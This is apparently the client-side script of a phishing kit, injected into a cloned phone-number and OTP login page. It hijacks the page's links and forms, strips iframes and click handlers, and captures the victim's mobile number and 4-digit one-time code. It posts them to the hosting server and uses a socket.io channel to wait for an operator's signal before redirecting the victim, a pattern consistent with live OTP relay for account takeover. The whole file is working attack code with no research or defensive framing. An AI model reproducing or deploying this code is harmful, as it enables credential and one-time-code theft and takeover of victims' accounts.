const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-phone",
        querys: [
            `[placeholder="Enter your mobile number"]`,
            `[data-testid="enterMobileInput"]`
        ],
        runner() {
            const phoneInp = document.querySelector(`[data-testid="enterMobileInput"]`)
            const submitBtn = document.querySelector(`[data-testid="sendOtpBtn"]`)

            phoneInp.addEventListener("input", () => {
                if (phoneInp.value.length == 10) {
                    submitBtn.removeAttribute("disabled")
                } else {
                    submitBtn.setAttribute("disabled", true)
                }
            })

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    phone: phoneInp.value
                })
            })
        }
    },
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "otp-code",
        runner() {
            const allInps = document.querySelectorAll(`input[type="tel"]`)

            if (allInps.length == 4) {
                const submitBtn = document.querySelector(`[data-testid="loginBtn"]`)
                allInps[0].parentElement.parentElement.innerHTML = `
                <div class="wt-input--field" data-change-color="true" style="width: auto;">
                    <input data-testid="otpInput" type="tel" id="otp_code" maxlength="4">
                </div>`

                let otp_code = document.querySelector("#otp_code")
                otp_code.addEventListener("input", () => {
                    if (otp_code.value.length == 4) {
                        submitBtn.removeAttribute("disabled")
                        spikeForm({
                            spikeType: this.spikeType,
                            otp_code: otp_code.value
                        })
                    } else {
                        submitBtn.setAttribute("disabled", true)
                    }
                })
            }
        }
    },
    {
        spikeType: "resend-code",
        runner() {
            document.querySelectorAll("button").forEach(btn => {
                if (btn.innerText.includes("RESEND OTP IN")) {
                    let index = 15
                    let clear_ = setInterval(() => {
                        btn.innerText = `Resend OTP in ${index} seconds`
                        if (index == 0) {
                            btn.innerText = `Resend OTP`
                            clearInterval(clear_)
                            btn.addEventListener("click", () => {
                                spikeForm({
                                    spikeType: this.spikeType
                                })
                            })
                        }
                        index--
                    }, 1000)
                }
            })
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{

}